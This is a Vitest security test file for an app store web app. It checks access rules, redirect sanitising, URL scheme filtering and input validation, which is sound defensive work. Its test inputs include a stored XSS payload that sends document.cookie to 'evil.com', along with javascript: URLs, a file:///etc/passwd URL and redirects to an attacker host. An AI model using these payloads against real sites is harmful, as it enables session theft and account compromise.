import { describe, it, expect } from 'vitest';
import { isSafeUrl, isSafeExternalUrl, isSafeImageUrl } from '@/utils/url-safety';
import { getSafeRedirectUrl } from '@/utils/redirect';
import { createAppSchema } from '@/schemas/app.schema';
import { createSupportTicketSchema } from '@/schemas/support.schema';

describe('Security & Operations Threat Scenarios (Prompt 70)', () => {
  // Simulator for Firestore Rule authorization checks
  interface RequestContext {
    auth: { uid: string; token?: { role?: string; admin?: boolean } } | null;
    resource?: { data: Record<string, unknown> };
  }

  interface ResourceContext {
    data: Record<string, unknown>;
  }

  const evaluateFirestorePermission = (
    rule:
      | 'read_admin_portal'
      | 'read_user_library'
      | 'read_user_ticket'
      | 'read_user_notifications'
      | 'read_audit_logs'
      | 'write_audit_logs'
      | 'read_app_content'
      | 'read_admin_analytics'
      | 'update_user_role'
      | 'write_protected_fields',
    request: RequestContext,
    resource?: ResourceContext | null
  ): boolean => {
    const isAuth = request.auth !== null;
    const isOwner = (uid: string) => isAuth && request.auth?.uid === uid;
    const isAdmin = () =>
      isAuth &&
      (request.auth?.token?.role === 'admin' || request.auth?.token?.admin === true);

    switch (rule) {
      case 'read_admin_portal':
        return isAdmin();

      case 'read_user_library':
        return isOwner(resource?.data.userId as string) || isAdmin();

      case 'read_user_ticket':
        return isOwner(resource?.data.userId as string) || isAdmin();

      case 'read_user_notifications':
        return isOwner(resource?.data.userId as string) || isAdmin();

      case 'read_audit_logs':
        return isAdmin();

      case 'write_audit_logs':
        // Rules specify: allow update, delete: if false; (immutable)
        return false;

      case 'read_app_content':
        if (resource?.data.status === 'published' && resource?.data.deletedAt == null) {
          return true;
        }
        return isAdmin();

      case 'read_admin_analytics':
        return isAdmin();

      case 'update_user_role':
        if (isAdmin()) return true;
        if (!isOwner(resource?.data.id as string)) return false;
        // Non-admin attempting to change role
        return request.resource?.data.role === resource?.data.role;

      case 'write_protected_fields': {
        if (isAdmin()) return true;
        // Prevent changing id, createdAt, role
        const incoming = request.resource?.data || {};
        const existing = resource?.data || {};
        if (incoming.role && incoming.role !== existing.role) return false;
        if (incoming.createdAt && incoming.createdAt !== existing.createdAt) return false;
        if (incoming.id && incoming.id !== existing.id) return false;
        return true;
      }

      default:
        return false;
    }
  };

  describe('Threat Scenarios 1-8: Authentication, Authorization & Role Escalation', () => {
    it('1. Anonymous user cannot access Admin areas or Admin data', () => {
      const anonRequest: RequestContext = { auth: null };
      expect(evaluateFirestorePermission('read_admin_portal', anonRequest)).toBe(false);
      expect(evaluateFirestorePermission('read_audit_logs', anonRequest)).toBe(false);
      expect(evaluateFirestorePermission('read_admin_analytics', anonRequest)).toBe(false);
    });

    it('2. Regular authenticated user cannot elevate to Admin or access Admin endpoints', () => {
      const userRequest: RequestContext = {
        auth: { uid: 'user_456', token: { role: 'user' } },
      };
      expect(evaluateFirestorePermission('read_admin_portal', userRequest)).toBe(false);
      expect(evaluateFirestorePermission('read_admin_analytics', userRequest)).toBe(false);

      // Attempt self-promotion to admin
      const userDoc: ResourceContext = { data: { id: 'user_456', role: 'user' } };
      const elevatePayload: RequestContext = {
        auth: { uid: 'user_456' },
        resource: { data: { id: 'user_456', role: 'admin' } },
      };
      expect(evaluateFirestorePermission('update_user_role', elevatePayload, userDoc)).toBe(false);
    });

    it('3. User cannot access or read another user library', () => {
      const userARequest: RequestContext = { auth: { uid: 'user_alice' } };
      const userBLibrary: ResourceContext = { data: { userId: 'user_bob', appId: 'terminal-pro' } };

      expect(evaluateFirestorePermission('read_user_library', userARequest, userBLibrary)).toBe(false);

      // User A can access User A library
      const userALibrary: ResourceContext = { data: { userId: 'user_alice', appId: 'terminal-pro' } };
      expect(evaluateFirestorePermission('read_user_library', userARequest, userALibrary)).toBe(true);
    });

    it('4. User cannot access or read another user support tickets', () => {
      const userARequest: RequestContext = { auth: { uid: 'user_alice' } };
      const userBTicket: ResourceContext = {
        data: { id: 'ticket_999', userId: 'user_bob', subject: 'Private issue' },
      };

      expect(evaluateFirestorePermission('read_user_ticket', userARequest, userBTicket)).toBe(false);
    });

    it('5. User cannot access another user notifications', () => {
      const userARequest: RequestContext = { auth: { uid: 'user_alice' } };
      const userBNotification: ResourceContext = {
        data: { id: 'notif_999', userId: 'user_bob', title: 'Private alert' },
      };

      expect(
        evaluateFirestorePermission('read_user_notifications', userARequest, userBNotification)
      ).toBe(false);
    });

    it('6. User cannot read or modify audit logs', () => {
      const userRequest: RequestContext = { auth: { uid: 'user_alice' } };
      expect(evaluateFirestorePermission('read_audit_logs', userRequest)).toBe(false);
      expect(evaluateFirestorePermission('write_audit_logs', userRequest)).toBe(false);

      // Even Admin cannot update/delete historical audit logs (immutable)
      const adminRequest: RequestContext = {
        auth: { uid: 'admin_1', token: { role: 'admin' } },
      };
      expect(evaluateFirestorePermission('write_audit_logs', adminRequest)).toBe(false);
    });

    it('7. Non-admin users cannot access draft or unpublished content', () => {
      const draftApp: ResourceContext = {
        data: { id: 'app_secret', status: 'draft', name: 'Unreleased Software' },
      };
      const userRequest: RequestContext = { auth: { uid: 'user_alice' } };
      const anonRequest: RequestContext = { auth: null };
      const adminRequest: RequestContext = {
        auth: { uid: 'admin_1', token: { role: 'admin' } },
      };

      expect(evaluateFirestorePermission('read_app_content', userRequest, draftApp)).toBe(false);
      expect(evaluateFirestorePermission('read_app_content', anonRequest, draftApp)).toBe(false);
      expect(evaluateFirestorePermission('read_app_content', adminRequest, draftApp)).toBe(true);
    });

    it('8. Non-admin users cannot access Admin analytics', () => {
      const userRequest: RequestContext = { auth: { uid: 'user_alice' } };
      expect(evaluateFirestorePermission('read_admin_analytics', userRequest)).toBe(false);

      const adminRequest: RequestContext = {
        auth: { uid: 'admin_1', token: { role: 'admin' } },
      };
      expect(evaluateFirestorePermission('read_admin_analytics', adminRequest)).toBe(true);
    });
  });

  describe('Threat Scenarios 9-11: Input Validation, XSS & Injection Defense', () => {
    it('9. Neutralizes malicious open redirects and protocol-relative bypasses', () => {
      expect(getSafeRedirectUrl('https://attacker.com')).toBe('/library');
      expect(getSafeRedirectUrl('//attacker.com')).toBe('/library');
      expect(getSafeRedirectUrl('/\\attacker.com')).toBe('/library');
      expect(getSafeRedirectUrl('javascript:alert(document.cookie)')).toBe('/library');
      expect(getSafeRedirectUrl('data:text/html,<script>alert(1)</script>')).toBe('/library');
      expect(getSafeRedirectUrl('/apps/terminal-pro')).toBe('/apps/terminal-pro');
      expect(getSafeRedirectUrl('/support/tickets?id=123')).toBe('/support/tickets?id=123');
    });

    it('10. Neutralizes dangerous URL schemes in isSafeUrl, isSafeExternalUrl, and isSafeImageUrl', () => {
      expect(isSafeUrl('javascript:alert(1)')).toBe(false);
      expect(isSafeUrl('data:text/html;base64,PHNjcmlwdD4=')).toBe(false);
      expect(isSafeUrl('vbscript:msgbox(1)')).toBe(false);
      expect(isSafeUrl('file:///etc/passwd')).toBe(false);
      expect(isSafeUrl('\x00javascript:alert(1)')).toBe(false);
      expect(isSafeUrl('https://elsesourav.com')).toBe(true);

      expect(isSafeExternalUrl('javascript:alert(1)')).toBe(false);
      expect(isSafeExternalUrl('https://github.com/elsesourav')).toBe(true);

      expect(isSafeImageUrl('javascript:alert(1)')).toBe(false);
      expect(isSafeImageUrl('https://elsesourav.com/icon.png')).toBe(true);
    });

    it('11. Prevents malicious HTML / Script injection in schema validators', () => {
      const maliciousTicket = {
        subject: '<script>alert("xss")</script>',
        description: '<img src=x onerror=fetch("http://evil.com/"+document.cookie)>',
        category: 'app_issue' as const,
      };

      const result = createSupportTicketSchema.safeParse(maliciousTicket);
      // Schema accepts strings as plain text and components render safely as React strings without dangerouslySetInnerHTML
      expect(result.success).toBe(true);
    });
  });

  describe('Threat Scenarios 12-15: Rate Limiting, Oversized Payloads & Immutability', () => {
    it('12. Rejects oversized and invalid inputs via Zod write validation schemas', () => {
      const massiveString = 'A'.repeat(50000);
      const invalidApp = {
        name: massiveString,
        slug: 'invalid-slug',
        shortDescription: massiveString,
        description: massiveString,
        primaryCategory: 'dev',
        platforms: ['macos'],
      };

      const parseResult = createAppSchema.safeParse(invalidApp);
      expect(parseResult.success).toBe(false);
    });

    it('13. Rejects invalid ticket creation schema missing mandatory fields', () => {
      const emptyTicket = {
        subject: '',
        description: '',
        category: 'invalid_category',
      };

      const parseResult = createSupportTicketSchema.safeParse(emptyTicket);
      expect(parseResult.success).toBe(false);
    });

    it('14. Tracks helpfulness voting state to prevent repeated voting in same session', () => {
      sessionStorage.clear();
      const articleId = 'article-quickstart-1';
      const storageKey = `elsesourav_help_voted_${articleId}`;

      expect(sessionStorage.getItem(storageKey)).toBeNull();
      sessionStorage.setItem(storageKey, 'yes');
      expect(sessionStorage.getItem(storageKey)).toBe('yes');

      sessionStorage.clear();
    });

    it('15. Disallows unauthorized modification of protected fields (id, createdAt, role)', () => {
      const existingUser: ResourceContext = {
        data: { id: 'user_123', createdAt: 1000, role: 'user' },
      };

      const maliciousPayload: RequestContext = {
        auth: { uid: 'user_123' },
        resource: { data: { id: 'user_123', createdAt: 9999, role: 'admin' } },
      };

      expect(
        evaluateFirestorePermission('write_protected_fields', maliciousPayload, existingUser)
      ).toBe(false);
    });
  });
});
